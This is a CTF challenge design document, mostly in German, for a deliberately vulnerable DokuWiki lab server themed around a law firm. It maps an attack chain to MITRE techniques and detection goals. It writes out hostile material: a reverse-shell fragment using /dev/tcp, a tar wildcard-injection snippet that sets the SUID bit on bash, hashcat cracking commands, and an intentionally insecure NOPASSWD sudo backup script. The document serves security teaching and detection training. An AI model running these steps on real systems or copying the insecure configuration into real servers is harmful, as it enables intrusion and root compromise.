# Challenge Design Document: SecureWiki

---

## Metadata

| Field | Value |
|-------|-------|
| **Author** | Marcel Madlener |
| **Challenge Name** | SecureWiki |
| **Difficulty Target** | Easy-Medium |
| **Estimated Solve Time** | 2.5 – 3 h |
| **Narrative / Theme** | Vernachlässigter Wiki-Server einer kleinen Anwaltskanzlei; ein verbliebenes vulnerables Plugin und ein zu großzügig konfiguriertes Backup-Skript führen von extern bis Root. |
| **Design Approach** | Goal-backward (primär) + Vuln-centric (für den Foothold) |
| **Status** | In Review |

---

## Part 1: Challenge Design  *(Block 1 – Chapter 2)*

### 1.1 Learning Objectives

**Offensive objectives**
1. CMS-Fingerprinting und Plugin-Enumeration auf einer DokuWiki-Installation.
2. Ausnutzung einer **unauthenticated Command Injection** (CWE-78) in einem Wiki-Plugin (CVE-2025-51958).
3. Credential-Harvesting aus DokuWiki-Konfigurations- und Auth-Dateien.
4. Offline-Passwort-Cracking mit `hashcat` auf bcrypt (Mode 3200), inklusive Hybrid-Mask-Attack mit kontextabhängigem Präfix.
5. Privilege Escalation über **Wildcard Injection in `tar`** via fehlkonfiguriertem `sudo`-Backup-Skript (`--checkpoint-action=exec=`).

**Defensive objectives**
1. Erkennung von Directory-Brute-Forcing (gobuster/feroxbuster) in `access.log` (404-Storm-Pattern, identische User-Agents).
2. Detection von Command-Injection-Payloads in URL-Parametern und POST-Bodies (Shell-Metacharacter-Signaturen).
3. Korrelation `www-data` → interaktive Shell → SSH-Login eines anderen Users → Root.
4. Detection ungewöhnlicher `sudo`-Aufrufe und verdächtiger Dateinamen (`--checkpoint-action=…`) in `auth.log` und `auditd`-Logs.

**Analytical objectives**
1. Parsing/Normalisierung von Apache-, Auth- und Audit-Logs nach ECS.
2. Threshold-basierte Regeln (404-Storms bei Directory-Enumeration).
3. Sequence-/EQL-Regeln für mehrstufige Angriffsketten (Web-Compromise → SSH → Sudo).
4. MITRE-ATT&CK-Mapping (T1595.003, T1190, T1059.004, T1083, T1552.001, T1110.002, T1021.004, T1548.003).

---

### 1.2 Design Approach

**Primary methodology:** Goal-backward.

**Why this approach?**
Linearität und Lösbarkeit sind im ersten Kursdurchgang wichtiger als Variation. Vom Ziel (`/root/root.txt`) rückwärts gedacht: Root-Flag → `tar`-Wildcard-Injection (sudo NOPASSWD) → SSH als `jhartmann` → bcrypt-Hash + kontextueller Hint → Web-Foothold via DokuWiki-Plugin-CVE → Recon. Jeder Schritt liefert deterministisch genau das Artefakt, das der nächste Schritt braucht.

**Secondary influences / blended approaches:**
- **Vuln-centric** für den Foothold: Die Wahl von CVE-2025-51958 ist bewusst, weil sie unauthentifiziert, zuverlässig und gut detektierbar ist (klare Logspur).
- **Narrative-driven** für Plausibilität: Die Versionsstände (PHP 7.4, DokuWiki Greebo) ergeben sich aus der Story (Server 2018 aufgesetzt, seit Anfang 2025 ohne Wartung).

---

### 1.3 Attack Chain

```
Phase 1: Reconnaissance
  → nmap entdeckt 22/tcp (SSH), 80/tcp (HTTP), 445/tcp (Samba — Rabbit Hole)

Phase 2: Enumeration
  → gobuster auf / findet /dokuwiki/
  → DokuWiki-Version 2018-04-22c "Greebo" via Footer / VERSION-Datei
  → Plugin-Verzeichnis /lib/plugins/ listet u.a. runcommand/

Phase 3: Initial Access (Foothold)
  → CVE-2025-51958: unauth. Command Injection im runcommand-Plugin
  → POST auf /dokuwiki/lib/plugins/runcommand/postaction.php
  → Reverse-Shell als www-data

Phase 4: Post-Exploitation
  → /var/www/dokuwiki/conf/local.php zeigt $conf['passcrypt'] = 'bcrypt'
  → /var/www/dokuwiki/conf/users.auth.php enthält bcrypt-Hash für jhartmann
  → /var/www/dokuwiki/data/pages/intern/passwortrichtlinie.txt enthält
    den Hint: "Alle Passwörter beginnen mit unserem Kanzlei-Kürzel HuP2023!"

Phase 5: Lateral Movement
  → hashcat -m 3200 hash.txt rockyou.txt -r best64.rule
    bzw. Hybrid-Mask: ?u?l?l?l?l?d (Anhang) auf Präfix HuP2023!
  → ssh jhartmann@securewiki, user.txt in /home/jhartmann/

Phase 6: Privilege Escalation
  → sudo -l → (root) NOPASSWD: /opt/scripts/backup_cases.sh
  → Skript führt in /home/jhartmann/case_files/ aus: tar czf /root/backup.tgz *
  → Wildcard Injection: --checkpoint=1, --checkpoint-action=exec=sh shell.sh
  → shell.sh setzt SUID-Bit auf /bin/bash → Root-Shell

Phase 7: Flag
  → /root/root.txt (MD5-formatierter String)
```

---

### 1.4 Vulnerabilities

**Vulnerability 1 — Initial Access**

| Field | Value |
|-------|-------|
| Type | OS Command Injection (CWE-78) |
| Location | DokuWiki-Plugin `runcommand` v2014-04-01, Endpoint `lib/plugins/runcommand/postaction.php` |
| CVE | CVE-2025-51958 |
| Educational value | Realistischer Plugin-CVE in einer langlebigen Open-Source-Anwendung; veranschaulicht, warum Plugin-Inventar zur Patchpolitik gehört. |
| Required exploit complexity | Simple — POST mit Shell-Metacharacter-Payload, kein Auth, öffentliche PoC verfügbar. |

**Vulnerability 2 — Credential Access**

| Field | Value |
|-------|-------|
| Type | Credentials in Files (T1552.001) |
| Location | `/var/www/dokuwiki/conf/users.auth.php` (bcrypt-Hash) + Wiki-Seite mit Passwort-Hint |
| Educational value | bcrypt korrekt erkannt → Mode 3200 → Hybrid-Mask-Attack (kein reines Wordlist-Cracking, weil rockyou.txt allein nicht reicht). |
| Required exploit complexity | Moderate — erfordert Hashcat-Regelnutzung oder Maskenkonstruktion. |

**Vulnerability 3 — Privilege Escalation**

| Field | Value |
|-------|-------|
| Type | Wildcard Injection / sudo-Misconfiguration |
| Specific technique | `tar … *` ausgeführt als root via NOPASSWD-Skript; Anlegen von `--checkpoint=1` und `--checkpoint-action=exec=sh shell.sh` als reguläre Dateien im Zielverzeichnis. |
| Educational value | Klassische, weiterhin in der Praxis anzutreffende Fehlkonfiguration; zwingt Spieler, das Skript zu lesen statt blind GTFOBins-Snippets zu kopieren. |

---

### 1.5 Rabbit Holes

**Rabbit Hole 1 — Samba**

| Field | Value |
|-------|-------|
| Service / path | Port 445/tcp, Share `Marketing` |
| Why interesting | Anonymous-Login funktioniert, Share heißt vielversprechend nach Kanzlei-Kontext, `enum4linux` zeigt Verzeichnisstruktur. |
| Why dead end | Share enthält nur Marketing-PDFs (Flyer, Visitenkarten-Vorlagen) mit harmlosen Inhalten, keine Credentials, keine Hinweise auf Wiki-Pfad. |
| Expected investigation time | 15 min |

**Rabbit Hole 2 — `/admin/` aus robots.txt**

| Field | Value |
|-------|-------|
| Service / path | `http://securewiki/admin/` |
| Why interesting | `robots.txt` listet `Disallow: /admin/`, suggeriert versteckten Admin-Bereich. |
| Why dead end | Endpoint liefert eine statische 403-Seite ohne weitere Funktionalität; kein PHP, keine Logik, keine Hinweise. |
| Expected investigation time | 10 min |

**Rabbit Hole 3 — DokuWiki-Login mit bekannten Default-Credentials**

| Field | Value |
|-------|-------|
| Service / path | `http://securewiki/dokuwiki/doku.php?do=login` |
| Why interesting | DokuWiki-Login sichtbar; `admin/admin`, `admin/password`, etc. sind die ersten Versuche. |
| Why dead end | Admin-Account hat ein starkes Random-Passwort (nicht knackbar); Brute-Force wird durch fehlende Lockouts zwar nicht blockiert, ist aber zeitlich aussichtslos. **Wichtig:** Der eigentliche Foothold ist *unauth*, der Login ist also gar nicht nötig. |
| Expected investigation time | 15 min |

---

### 1.6 Flag Design

**User flag**

| Field | Value |
|-------|-------|
| Location | `/home/jhartmann/user.txt` |
| Format | 32-stelliger Hex-String (MD5-Format) |
| Narrative justification | Datei wurde vom Datenschutzbeauftragten als Marker für "Ich habe diesen Account übernommen" platziert. |
| Discoverability | Standard — Home-Verzeichnis nach SSH-Login. |

**Root flag**

| Field | Value |
|-------|-------|
| Location | `/root/root.txt` |
| Format | 32-stelliger Hex-String (MD5-Format) |
| Narrative justification | Liegt im Mandanten-Backup-Verzeichnis-Marker, repräsentiert die "vertraulichen Mandantenakten". |
| Discoverability | Standard — Root-Home nach Privesc. |

---

### 1.7 Software Stack

**Base OS:** Ubuntu 22.04.4 LTS (Jammy Jellyfish)

| Role | Software | Target Version | CVE / Vuln |
|------|----------|----------------|-----------|
| Web server | Apache HTTP Server | 2.4.52 (Ubuntu-Default) | — (nicht Teil der Kette) |
| PHP runtime | PHP-FPM via `ppa:ondrej/php` | 7.4.33 | — (Greebo benötigt PHP ≤ 7.4) |
| Web application | DokuWiki | 2018-04-22c "Greebo" | indirekt — vulnerables Plugin |
| Wiki plugin | aelsantex/runcommand | 2014-04-01 | **CVE-2025-51958** |
| SSH | OpenSSH | 8.9p1 (Ubuntu-Default) | — (nur Lateral Movement) |
| File sharing | Samba | 4.15.x (Ubuntu-Default) | — (Rabbit Hole) |
| Archiver | GNU tar | 1.34 (Ubuntu-Default) | Wildcard-Behavior (kein CVE, by design) |

---

### 1.8 Difficulty Matrices

#### Inspiration Matrix Self-Assessment

| Step | Inspiration Needed | Work Required | Predicted Quality |
|------|--------------------|---------------|-------------------|
| Initial Recon | Niedrig | Niedrig | Hoch — Standard-`nmap` reicht |
| Web-Enum / Plugin-Discovery | Niedrig-Mittel | Mittel | Hoch — gobuster + Browsen |
| CVE-Recherche | Mittel | Niedrig | Hoch — eindeutige Treffer bei Suche nach Plugin-Name |
| Foothold-Exploitation | Niedrig | Mittel | Hoch — PoC oder simple curl-Konstruktion |
| Post-Exploitation (Hash + Hint) | Mittel | Mittel | Hoch — zwei klare Dateien zu lesen |
| Hash-Cracking | Mittel-Hoch | Mittel | Hoch — Hint forciert Hybrid-Mask |
| Privesc (sudo + Skript-Analyse) | Mittel | Mittel | Hoch — Skript ist lesbar, Technik bekannt |

**Overall position:** *Challenging* (Mittlere Inspiration, mittlerer Aufwand, hohe Lernqualität.)


#### Setup × Exploitation Matrix

| Dimension | Rating | Justification |
|-----------|--------|---------------|
| Setup difficulty | Moderate | PHP-7.4-PPA, manuelles DokuWiki-Tarball-Deployment, Plugin-Installation, sudoers-NOPASSWD-Eintrag, Backup-Skript, bcrypt-User-Hash, Wiki-Seiteninhalt für Hint. |
| Exploitation difficulty | Moderate | Mehrere Phasen, jede Phase nutzt eine andere Tool-Klasse (Web-Recon → CVE-Exploit → Hashcat → SSH → GTFOBins-Trick). |
| Matrix position | Moderate / Moderate | Hoher Lerneffekt gegenüber überschaubarem Builder-Aufwand. |

**Is the builder-time investment proportional to the learning outcome?** — Ja: ~5h Setup für ~3 h Spielzeit, die fünf eigenständige Lernziele abdeckt.

---

### 1.9 "Secure Everything Else" Plan

| Service / Config | Risk if Left Open | Hardening Action |
|------------------|-------------------|------------------|
| SSH Root-Login | Direkter Root-Bypass | `PermitRootLogin no` in `/etc/ssh/sshd_config` |
| SSH Password-Auth für `jhartmann` | Story erfordert Pass-Auth, aber kein Brute-Force-Speedrun | `MaxAuthTries 3` + fail2ban (10 min Ban nach 5 Fehlversuchen) — Brute-Force unattraktiv, aber erkennbar im Log |
| DokuWiki `admin`-User | Default-Cred-Login könnte Lösung verkürzen | Random 24-Zeichen-Passwort, nicht in Wordlists |
| Samba sonstige Shares | Zugriff auf Hostsystem | Nur ein Read-only-Share `Marketing`; `usershares` deaktiviert |
| MySQL/PostgreSQL | Falscher Foothold-Vektor | Nicht installiert |
| Apache `mod_status` | Information Disclosure | Nicht aktiviert |
| Sonstige `sudo`-Rechte für `jhartmann` | Alternative Privesc-Pfade | Ausschließlich `/opt/scripts/backup_cases.sh` erlaubt |
| Andere SUID-Binaries | Unbeabsichtigte GTFOBins-Pfade | `find / -perm -4000` mit Default-Liste vergleichen, keine zusätzlichen SUID-Binaries |
| Outbound-Firewall (für Reverse-Shell) | Kein Outbound = unspielbar | Outbound auf alle Ports erlaubt (Story: "interner Server, keine egress filter") |

---

### 1.10 Narrative

**Your narrative:**

Die *Hartmann & Partner Rechtsanwälte*, eine Kanzlei mit fünf Mitarbeitern, betreibt ein internes Wiki für Fallnotizen und Mandantenkontakte. Der Server `securewiki.hartmann-legal.local` (Ubuntu 22.04) wurde **2018 vom damaligen IT-affinen Schwiegersohn der Seniorpartnerin** als DokuWiki-Instanz aufgesetzt; dieser hatte sich das `runcommand`-Plugin für ein nie zu Ende geführtes Skript-Frontend installiert. **2023** übergab die Kanzlei die Wartung an einen externen IT-Dienstleister, der nichts an Versionen änderte ("läuft ja"). Der Dienstleister verließ die Kanzlei **Anfang 2025**; seitdem patcht niemand mehr. Eine Paralegal mit SSH-Zugang (`jhartmann`) hatte vor Monaten um einen schnellen Backup-Helfer gebeten, den der Admin per `sudo NOPASSWD` "mal eben" freigegeben hat. Der Spieler ist externer Penetration Tester im Auftrag des **neu eingestellten Datenschutzbeauftragten** und soll nachweisen, dass vertrauliche Mandantenakten kompromittierbar sind.

**Does the narrative justify:**
- [x] Welche Services exponiert sind (Wiki = HTTP/80; SSH für Remote-Wartung; Samba für die Praktikantin, die mal Marketingflyer abgelegt hat)
- [x] Warum bestimmte Versionen veraltet sind (kein Patch-Vertrag mehr seit Anfang 2025; Server seit 2018 ohne nennenswertes Upgrade — passt zu DokuWiki Greebo + PHP 7.4)
- [x] Warum bestimmte Misconfigurations existieren (NOPASSWD-Backup-Skript war Gefälligkeit, dokumentiert in Wiki-Seite "IT-Tickets")
- [x] Die Präsenz von Credentials in vorhersagbaren Pfaden (DokuWiki-Standardpfade, Hint im Wiki selbst)

---

## Part 2: Attack Surface Specification  *(Block 2 – Chapter 3)*

### 2.1 Expected nmap Output

```
$ nmap -sV -sC -p- -T4 192.168.56.110

Nmap scan report for 192.168.56.110
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (reset)

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a1:b2:c3:d4:e5:f6:... (ECDSA)
|_  256 1a:2b:3c:4d:5e:6f:... (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Hartmann & Partner – Internes Wiki
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin/
445/tcp open  netbios-ssn Samba smbd 4.15.13-Ubuntu (workgroup: WORKGROUP)

Service Info: Host: SECUREWIKI; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

### 2.2 Service Table

| Port | Service | Version | Role | Justification |
|------|---------|---------|------|---------------|
| 22 | SSH | OpenSSH 8.9p1 | Lateral Movement | Login mit gecracktem Passwort von `jhartmann`. |
| 80 | HTTP | Apache 2.4.52 + DokuWiki Greebo + runcommand-Plugin | Primary Attack Surface | Foothold via CVE-2025-51958. |
| 445 | SMB | Samba 4.15 | Rabbit Hole | Anonymous Read-only Share mit Marketing-Material; kein Pfad zur Lösung. |

**Service count:** 3

**Standard vs. non-standard ports:** Alle drei Services laufen auf Standard-Ports, weil die Story keinen Anlass für Umzüge gibt (interner Wartungs-Server eines kleinen Betriebs).

---

### 2.3 Enumeration Tree

```
Initial Scan (nmap)                                  t = 0–5 min
├── 22/tcp  OpenSSH 8.9p1
│   └── Banner-Grab; SSH ohne bekannten unauth-Vector
│       └── kein Cred → [? offen, brauche Account]      [✓ später für Lateral]
├── 80/tcp  Apache 2.4.52
│   ├── curl http://target/                          t = 6 min
│   │   └── HTML-Landingpage mit Link → /dokuwiki/    [✓ attack path]
│   ├── gobuster dir / common.txt                    t = 10 min
│   │   ├── /dokuwiki/                                [✓ attack path]
│   │   ├── /admin/  (403, statisch)                  [✗ rabbit hole]
│   │   └── /robots.txt → /admin/                     [✗ rabbit hole]
│   ├── DokuWiki-Footer: "Release 2018-04-22c Greebo" t = 15 min
│   │   └── Plugin-Verzeichnis /lib/plugins/          [✓ attack path]
│   │       └── runcommand/  → Web-Suche → CVE-2025-51958
│   ├── /dokuwiki/doku.php?do=login                  t = 20 min
│   │   └── admin-Login mit Default-Creds versuchen   [✗ rabbit hole]
│   └── Exploit /lib/plugins/runcommand/postaction.php
│       └── www-data Reverse-Shell                    [✓ foothold]
└── 445/tcp Samba 4.15
    ├── enum4linux -a target                         t = 8 min
    │   └── Share "Marketing" (anonymous, RO)          [✗ rabbit hole]
    └── smbclient //target/Marketing                  t = 12 min
        └── nur PDFs (Flyer, Visitenkarten)            [✗ rabbit hole, Ende]
```

---

### 2.4 Detailed Enumeration Results Per Service

**Port 80 — Apache + DokuWiki**

```
$ gobuster dir -u http://192.168.56.110/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
===============================================================
/admin                (Status: 403) [Size: 277]
/dokuwiki             (Status: 301) [Size: 320] [--> /dokuwiki/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size:  28]
===============================================================

$ curl http://192.168.56.110/dokuwiki/ | grep -oE 'Release [0-9-]+[a-z]?'
Release 2018-04-22c

$ curl http://192.168.56.110/dokuwiki/lib/plugins/
<title>Index of /dokuwiki/lib/plugins</title>
...
runcommand/         2018-08-11
...

$ # Web-Suche: "dokuwiki runcommand cve" → CVE-2025-51958
```

Classification: **Attack path**.
Key finding for attacker: DokuWiki Greebo + verwundbares `runcommand`-Plugin → CVE-2025-51958.

**Port 22 — OpenSSH**

```
$ nc -nv 192.168.56.110 22
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
```

Classification: **Attack path (Lateral Movement, kein direkter Foothold)**.
Key finding for attacker: Aktuelle Version, keine bekannte unauth. RCE; warten auf Credentials.

**Port 445 — Samba**

```
$ enum4linux -a 192.168.56.110
...
[+] Sharename       Type      Comment
    Marketing       Disk      Public Marketing Material (READ-ONLY)
    IPC$            IPC       IPC Service

$ smbclient //192.168.56.110/Marketing -N
smb: \> ls
  Kanzleiflyer_2024.pdf
  Visitenkarte_Hartmann.pdf
  Mandantenbroschuere.pdf
```

Classification: **Rabbit hole**.
Key finding for attacker: Nur Marketing-PDFs, keine Credentials, keine internen Pfade.

---

### 2.5 Service Interaction Dependencies

```
Apache + DokuWiki + runcommand-Plugin (Port 80)
    ↓ exec via CVE-2025-51958 (HTTP POST)
Reverse-Shell als www-data
    ↓ liest
/var/www/dokuwiki/conf/local.php   (passcrypt = bcrypt)
/var/www/dokuwiki/conf/users.auth.php (jhartmann:$2y$10$…:Julia Hartmann:…:user)
/var/www/dokuwiki/data/pages/intern/passwortrichtlinie.txt (Hint: "HuP2023!")
    ↓ hashcat (offline, lokal beim Spieler)
Klartext-Passwort jhartmann
    ↓ verwendet bei
SSH (Port 22)
    ↓ User-Shell jhartmann; sudo -l
/opt/scripts/backup_cases.sh (NOPASSWD, root)
    ↓ tar … * mit injizierten Dateinamen
Root-Shell
```

---

### 2.6 Version-Specific Requirements

| Package | Required Version | Pinning Method | Reason |
|---------|------------------|----------------|--------|
| `php7.4` (FPM, CLI, Mods) | 7.4.33 | `apt pinning` (Pin-Priority 1001 für `ppa:ondrej/php`) | Greebo läuft nicht auf PHP 8.x |
| DokuWiki | 2018-04-22c "Greebo" | Tarball + nicht das `upgrade`-Plugin aktivieren; `data/`-Verzeichnis enthält `VERSION` mit Versionsstand | runcommand-Plugin funktioniert ab Hogfather (2020-07-29) nicht mehr |
| `runcommand`-Plugin | 2014-04-01 (Original Master von `aelsantex/runcommand`) | Statisch entpackt, kein Auto-Update | Nur diese Version trägt CVE-2025-51958 |
| `apache2` | 2.4.52-1ubuntu4.x | `apt-mark hold apache2 apache2-bin apache2-utils` | Spätere Updates ändern Default-Configs nicht direkt sicherheitsrelevant, aber Pin sorgt für Reproduzierbarkeit |
| `openssh-server` | 8.9p1-3ubuntu0.6 | `apt-mark hold` | Reproduzierbarkeit |
| `samba` | 4.15.13 | `apt-mark hold` | Reproduzierbarkeit |
| `tar` | 1.34 | `apt-mark hold` | Wildcard-Verhalten ist by design — Pin sichert Stabilität |
| Auto-updates | aus | `systemctl disable --now unattended-upgrades` + Entfernen von `20auto-upgrades` | Kein versehentlicher Patch der Sicherheitslücken |

---

### 2.7 Block 2 Validation Checklist

- [x] Service count is reasonable (3-6) — 3 Services
- [x] Every service has a clearly stated purpose (attack path or rabbit hole)
- [x] Enumeration tree is complete – all branches documented
- [x] Every discovery step uses standard tools (nmap, gobuster, smbclient, enum4linux, curl)
- [x] Rabbit holes are convincingly interesting but clearly dead ends
- [x] Total enumeration time matches the target difficulty level (~30 min Recon+Enum für Easy-Medium)
- [x] All specified versions are obtainable (PHP 7.4 via `ppa:ondrej/php`, DokuWiki Greebo via offizielles Archiv `https://download.dokuwiki.org/src/dokuwiki/dokuwiki-2018-04-22c.tgz`, runcommand-Plugin via GitHub `aelsantex/runcommand` Master-Zip)

---

## Part 3: Vulnerability Specification  *(Block 3 – Chapter 4)*

### 3.1 Complete Attack Chain with MITRE ATT&CK Mapping

| Step | Phase | Technique ID | Technique Name | Tactic | Primary Log Source |
|------|-------|--------------|----------------|--------|---------------------|
| 1 | Recon | T1046 | Network Service Discovery | Discovery | (extern; ggf. Firewall-Logs) |
| 2 | Recon | T1595.003 | Active Scanning: Wordlist Scanning | Reconnaissance | `/var/log/apache2/access.log` (404-Burst) |
| 3 | Recon | T1592.002 | Software (Plugin/CMS Fingerprinting) | Reconnaissance | `access.log` (Requests an `/lib/plugins/`) |
| 4 | Initial Access | T1190 | Exploit Public-Facing Application | Initial Access | `access.log` (POST auf `postaction.php` mit Payload) |
| 5 | Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution | `auth.log` / `auditd` (Spawned Shell als `www-data`) |
| 6 | Discovery | T1083 | File and Directory Discovery | Discovery | `auditd` (Reads auf `conf/`) |
| 7 | Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | `auditd` (Read auf `users.auth.php`) |
| 8 | Credential Access | T1110.002 | Brute Force: Password Cracking | Credential Access | (offline beim Angreifer) |
| 9 | Lateral Movement | T1021.004 | Remote Services: SSH | Lateral Movement | `auth.log` (`Accepted password for jhartmann`) |
| 10 | Privilege Escalation | T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching | Privilege Escalation | `auth.log` (`sudo` ohne TTY-Prompt), `audit.log` |
| 11 | Privilege Escalation | T1574.011 / T1059.004 | Hijack Execution Flow (Wildcard) / Unix Shell | Privilege Escalation / Execution | `auditd` (`tar`-Aufruf mit `--checkpoint*`) |

**Total unique techniques:** 10
**Tactics covered:** Reconnaissance, Discovery, Initial Access, Execution, Credential Access, Lateral Movement, Privilege Escalation (7 von 14 Top-Level-Tactics)

---

### 3.2 Vulnerability Evaluation

**Vulnerability 1 — CVE-2025-51958 (DokuWiki runcommand Command Injection)**

| Criterion | Met? | Notes |
|-----------|------|-------|
| 1. Realism | ✓ | Echter, 2025 publizierter CVE; Plugin seit 2014 nicht mehr gepflegt — exakt das Profil eines vergessenen Plugins in einer KMU-Installation. |
| 2. Discoverability | ✓ | Plugin-Verzeichnis ist via `/lib/plugins/` listbar; CVE-Suche nach Plugin-Name liefert sofort Treffer. |
| 3. Exploitability | ✓ | Unauth, einzelner POST-Request, deterministisch reproduzierbar. |
| 4. Log Visibility | ✓ | POST-Request mit Shell-Metacharaktern in Apache-`access.log` und Body in `auditd`-Logs sichtbar. |
| 5. Difficulty Fit | ✓ | Easy-Medium passt: erfordert CVE-Recherche und einfache Payload-Konstruktion, aber kein eigenes Bug-Hunting. |
| 6. Educational Value | ✓ | Plugin-Hygiene, CWE-78, Apache-Logmonitoring — alle drei Lernebenen abgedeckt. |
| 7. MITRE Mapping | ✓ | T1190 (Initial Access). |

**Score:** 7/7
**Decision:** Keep.

---

**Vulnerability 2 — Credentials In Files + Offline Cracking**

| Criterion | Met? | Notes |
|-----------|------|-------|
| 1. Realism | ✓ | DokuWiki speichert Hashes legitim in `users.auth.php`. Hint im Wiki ("Passwortpolicy") ist ein realistisches "shadow IT"-Artefakt. |
| 2. Discoverability | ✓ | Standard-Pfad, in jedem DokuWiki-Tutorial dokumentiert. |
| 3. Exploitability | ✓ | bcrypt mit `cost=10`, mit Hint via Hybrid-Mask-Attack in Minuten knackbar. Ohne Hint nicht — aber Hint ist gewollt findbar. |
| 4. Log Visibility | ✓ | Read auf `users.auth.php` durch `www-data` ist auditierbar (`auditd` File-Watch). |
| 5. Difficulty Fit | ✓ | Forciert Hashcat-Regeln/Masken, nicht bloß rockyou.txt. |
| 6. Educational Value | ✓ | Hash-Identifikation, Mode-Wahl, Mask/Hybrid-Attack — Standardstoff. |
| 7. MITRE Mapping | ✓ | T1552.001 + T1110.002. |

**Score:** 7/7
**Decision:** Keep.

---

**Vulnerability 3 — `tar`-Wildcard-Injection via sudo NOPASSWD**

| Criterion | Met? | Notes |
|-----------|------|-------|
| 1. Realism | ✓ | NOPASSWD-Backup-Skripte sind in KMU-Umgebungen sehr verbreitet; Story-Begründung ist plausibel. |
| 2. Discoverability | ✓ | `sudo -l` ist Standard-Privesc-Schritt; Skriptpfad ist lesbar. |
| 3. Exploitability | ✓ | GTFOBins-bekannte Technik; mit `echo > '--checkpoint=1'` etc. zuverlässig. |
| 4. Log Visibility | ✓ | `auth.log` zeigt `sudo` ohne TTY-Prompt; `auditd` sieht `tar`-Argumente; Verdachtssignatur über Elastic-Detection-Rule "Potential Shell via Wildcard Injection" abgedeckt. |
| 5. Difficulty Fit | ✓ | Mittlere Inspiration nötig (Skript lesen, Wildcard-Konzept), keine Trial-and-Error-Schleife. |
| 6. Educational Value | ✓ | Klassiker der UNIX-Privesc; deckt sudo-Hardening + Skript-Hygiene ab. |
| 7. MITRE Mapping | ✓ | T1548.003 + T1574.011 / T1059.004. |

**Score:** 7/7
**Decision:** Keep.

---

### 3.3 Exploit Test Reports

**Test Report — CVE-2025-51958**

| Field | Value |
|-------|-------|
| Date | 26.04.2026 |
| Vulnerability | DokuWiki runcommand Plugin Unauth Command Injection |
| Software & version | DokuWiki 2018-04-22c "Greebo" + runcommand 2014-04-01 |
| Lab OS | Ubuntu 22.04.4 LTS, PHP 7.4.33 (FPM), Apache 2.4.52 |
| Installation method | DokuWiki: offizielles Tarball aus `https://download.dokuwiki.org/src/dokuwiki/dokuwiki-2018-04-22c.tgz`. Plugin: ZIP von `https://github.com/aelsantex/runcommand/archive/master.zip` nach `/var/www/dokuwiki/lib/plugins/runcommand/`. Plugin in `conf/plugins.local.php` aktivieren; `script_dir` z.B. auf `data/scripts` setzen. |
| Exploit source | Manuelle Konstruktion entsprechend CVE-Beschreibung (CWE-78 in `postaction.php`); zusätzlich öffentlicher PoC referenziert. |
| Configuration changes needed | `script_dir` muss auf einen existierenden Pfad innerhalb `DOKUWIKI_ROOT` zeigen; Beispiel-Skript `listfiles.sh` (mode 755) im `script_dir` anlegen, damit `runcommand` als "konfiguriert" gilt. |
| Test success rate | 2 / 2 Versuche (Solltestkriterium) |
| Timing to shell | ~10–20 s (Reverse Shell etabliert) |
| Logs generated | `access.log`: `POST /dokuwiki/lib/plugins/runcommand/postaction.php HTTP/1.1` mit URL-codierten Shell-Metacharaktern im Body. `auditd`: `EXECVE` von `/bin/sh` durch `www-data` mit `bash -i >& /dev/tcp/.../...`. |
| **Decision** | Use in challenge: **Yes** |

---

**Test Report — Hashcat bcrypt Hybrid-Mask**

| Field | Value |
|-------|-------|
| Vulnerability | Credentials in Files + schwaches Klartext-Passwort mit Org-Präfix |
| Software & version | hashcat v6.2.6 (Angreiferseite), DokuWiki bcrypt (`$2y$10$…`) |
| Installation method | Hash händisch in `users.auth.php` setzen via `php -r 'echo password_hash("HuP2023!Sommer42", PASSWORD_BCRYPT);'` |
| Exploit source | `hashcat -m 3200 hash.txt -a 6 wordlist.txt ?u?l?l?l?l?d?d` mit kuratiertem Wordlist `[Sommer, Winter, Herbst, Fruehling, Kanzlei, Akte]`. |
| Test success rate | 5 / 5 (mit Hint), 0 / 5 (ohne Hint, Standard-Wörterbuch) — **bestätigt Hint-Notwendigkeit**. |
| Timing to crack | < 5 min auf einem mittleren Laptop (CPU). |
| Logs generated | (offline; keine Server-Logs) |
| **Decision** | Use: **Yes** |

---

**Test Report — `tar`-Wildcard-Injection**

| Field | Value |
|-------|-------|
| Vulnerability | sudo NOPASSWD Skript mit `tar … *` in user-writable Directory |
| Software & version | GNU tar 1.34, sudo 1.9.9 (Ubuntu 22.04 default) |
| Installation method | `/opt/scripts/backup_cases.sh` mit Inhalt:<br>`#!/bin/bash`<br>`cd /home/jhartmann/case_files`<br>`/usr/bin/tar czf /root/backup.tgz *`<br>chmod 755, owner root:root.<br>`/etc/sudoers.d/jhartmann-backup`: `jhartmann ALL=(root) NOPASSWD: /opt/scripts/backup_cases.sh` |
| Exploit source | GTFOBins (`tar`); Standard-Snippet:<br>`cd /home/jhartmann/case_files`<br>`echo 'chmod u+s /bin/bash' > shell.sh`<br>`echo "" > "--checkpoint-action=exec=sh shell.sh"`<br>`echo "" > --checkpoint=1`<br>`sudo /opt/scripts/backup_cases.sh`<br>`/bin/bash -p` |
| Test success rate | 5 / 5 |
| Timing to root | ~30 s |
| Logs generated | `auth.log`: `sudo: jhartmann : COMMAND=/opt/scripts/backup_cases.sh`. `auditd`: `tar … --checkpoint=1 --checkpoint-action=exec=sh shell.sh` (auffällige Argumente). |
| **Decision** | Use: **Yes** |

---

### 3.4 Version Pinning Strategy

| Package | Final Version | OS | Pinning Method | Verified? |
|---------|---------------|----|----------------|-----------|
| php7.4 (php7.4-cli, php7.4-fpm, php7.4-xml, php7.4-mbstring, php7.4-gd, php7.4-zip, php7.4-curl) | 7.4.33-* aus `ppa:ondrej/php` | Ubuntu 22.04 | `apt-mark hold` + `/etc/apt/preferences.d/php74.pref` mit Pin-Priority 1001 | [ ] |
| DokuWiki | 2018-04-22c | (Tarball, kein apt) | Tarball entpackt, `upgrade`-Plugin nicht installiert; `conf/plugins.local.php` blockiert Auto-Updates | [ ] |
